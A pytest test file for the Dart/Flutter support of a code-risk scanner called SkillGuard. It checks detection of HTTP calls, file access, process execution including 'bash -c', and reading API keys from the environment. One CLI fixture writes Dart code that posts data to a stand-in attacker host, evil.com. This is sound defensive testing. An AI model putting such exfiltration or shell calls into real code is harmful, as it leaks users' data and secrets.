"""
Tests for Dart/Flutter support in SkillGuard.

Covers:
- DartScanner detection of all 8 rule categories
- repository_discovery: .dart files included in SUPPORTED_EXTENSIONS
- CLI integration: scanning a Flutter project alongside Python/JS/TS repos
"""
import json
from pathlib import Path
import pytest
from typer.testing import CliRunner

from skillguard.scanners.dart_scanner import DartScanner
from skillguard.core.repository_discovery import discover_files, SUPPORTED_EXTENSIONS
from skillguard.app import app

runner = CliRunner()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def write_dart(tmp_path: Path, name: str, content: str) -> Path:
    f = tmp_path / name
    f.write_text(content, encoding="utf-8")
    return f


# ---------------------------------------------------------------------------
# DartScanner unit tests
# ---------------------------------------------------------------------------

class TestDartScannerNetworkDetection:
    def test_http_get(self, tmp_path):
        f = write_dart(tmp_path, "api.dart", "final resp = await http.get(Uri.parse(url));")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "NET201" in ids

    def test_http_post(self, tmp_path):
        f = write_dart(tmp_path, "api.dart", "final resp = await http.post(Uri.parse(url), body: data);")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "NET202" in ids

    def test_dio_client(self, tmp_path):
        f = write_dart(tmp_path, "client.dart", "final dio = Dio();\nawait dio.get('/endpoint');")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "NET203" in ids


class TestDartScannerFilesystemDetection:
    def test_file_constructor(self, tmp_path):
        f = write_dart(tmp_path, "fs.dart", "final file = File('/tmp/data.json');\nawait file.readAsString();")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "FIL201" in ids

    def test_directory_constructor(self, tmp_path):
        f = write_dart(tmp_path, "dir.dart", "final dir = Directory('/tmp/output');\nawait dir.create(recursive: true);")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "FIL202" in ids


class TestDartScannerCommandExecution:
    def test_process_run(self, tmp_path):
        f = write_dart(tmp_path, "cmd.dart", "final result = await Process.run('ls', ['-la']);")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "CMD201" in ids

    def test_process_start(self, tmp_path):
        f = write_dart(tmp_path, "cmd.dart", "final process = await Process.start('bash', ['-c', cmd]);")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "CMD202" in ids


class TestDartScannerEnvironmentDetection:
    def test_platform_environment(self, tmp_path):
        f = write_dart(tmp_path, "env.dart", "final key = Platform.environment['API_KEY'] ?? '';")
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        assert "SEC201" in ids


class TestDartScannerCommentStripping:
    def test_ignores_single_line_comments(self, tmp_path):
        f = write_dart(tmp_path, "safe.dart", "// final resp = await http.get(url); // commented out")
        findings = DartScanner(f, tmp_path).scan()
        assert findings == []

    def test_ignores_block_comments(self, tmp_path):
        content = "/*\n await http.post(url);\n*/\nvoid main() {}"
        f = write_dart(tmp_path, "safe.dart", content)
        findings = DartScanner(f, tmp_path).scan()
        assert findings == []

    def test_empty_file(self, tmp_path):
        f = write_dart(tmp_path, "empty.dart", "")
        findings = DartScanner(f, tmp_path).scan()
        assert findings == []


class TestDartScannerMultipleFindings:
    def test_combined_flutter_service(self, tmp_path):
        content = """\
import 'package:http/http.dart' as http;
import 'dart:io';

class WeatherService {
  final _dio = Dio();

  Future<String> fetchWeather(String city) async {
    final key = Platform.environment['API_KEY'] ?? '';
    final resp = await http.get(Uri.parse('https://api.example.com/weather?city=$city&key=$key'));
    final file = File('/cache/weather.json');
    await file.writeAsString(resp.body);
    return resp.body;
  }
}
"""
        f = write_dart(tmp_path, "weather_service.dart", content)
        findings = DartScanner(f, tmp_path).scan()
        ids = {fn.id for fn in findings}
        # Should detect http.get (NET201), Dio (NET203), Platform.environment (SEC201), File (FIL201)
        assert "NET201" in ids
        assert "NET203" in ids
        assert "SEC201" in ids
        assert "FIL201" in ids


# ---------------------------------------------------------------------------
# Repository discovery: .dart included
# ---------------------------------------------------------------------------

def test_dart_extension_supported():
    assert ".dart" in SUPPORTED_EXTENSIONS
    assert SUPPORTED_EXTENSIONS[".dart"] == "Dart"


def test_dart_files_discovered(tmp_path):
    dart_file = tmp_path / "main.dart"
    dart_file.write_text("void main() {}", encoding="utf-8")

    files, git_repos = discover_files(tmp_path)
    assert dart_file in files


# ---------------------------------------------------------------------------
# CLI integration — Flutter project alongside Python/JS/TS
# ---------------------------------------------------------------------------

def test_cli_scan_flutter_project(tmp_path):
    """Single Flutter project: Dart files discovered and scanned."""
    dart_dir = tmp_path / "flutter_app"
    dart_dir.mkdir()
    (dart_dir / "main.dart").write_text("void main() {}", encoding="utf-8")
    (dart_dir / "api.dart").write_text(
        "import 'package:http/http.dart' as http;\n"
        "final resp = await http.post(Uri.parse('https://evil.com/data'));\n",
        encoding="utf-8",
    )

    result = runner.invoke(app, ["scan", str(tmp_path)])
    assert result.exit_code == 0
    assert "Dart" in result.stdout
    assert "Found 1 repositories" in result.stdout
    assert "Found 2 source files" in result.stdout


def test_cli_scan_mixed_polyglot_portfolio(tmp_path):
    """Portfolio of Python, JS, TS, and Dart repos are all discovered."""
    # Python repo
    py_repo = tmp_path / "backend"
    py_repo.mkdir()
    (py_repo / "server.py").write_text("import requests\nrequests.get('http://example.com')\n", encoding="utf-8")

    # JS repo
    js_repo = tmp_path / "frontend"
    js_repo.mkdir()
    (js_repo / "index.js").write_text("fetch('https://api.example.com/data');", encoding="utf-8")

    # TS repo
    ts_repo = tmp_path / "api_client"
    ts_repo.mkdir()
    (ts_repo / "client.ts").write_text("const key = process.env.API_KEY;", encoding="utf-8")

    # Flutter / Dart repo
    flutter_repo = tmp_path / "mobile"
    flutter_repo.mkdir()
    (flutter_repo / "service.dart").write_text(
        "final result = await Process.run('ls', ['-la']);\n", encoding="utf-8"
    )

    report_file = tmp_path / "report.json"
    result = runner.invoke(app, ["scan", str(tmp_path), "--output", str(report_file)])

    assert result.exit_code == 0
    assert "Found 4 repositories" in result.stdout
    assert "Found 4 source files" in result.stdout
    assert "Python: 1" in result.stdout
    assert "JavaScript: 1" in result.stdout
    assert "TypeScript: 1" in result.stdout
    assert "Dart: 1" in result.stdout

    assert report_file.exists()
    data = json.loads(report_file.read_text(encoding="utf-8"))
    # Should have at least the Process.run HIGH finding from Dart repo
    all_findings = data.get("findings", [])
    dart_findings = [f for f in all_findings if "Dart" in f.get("message", "") or f.get("id", "").startswith("CMD2")]
    assert len(dart_findings) >= 1
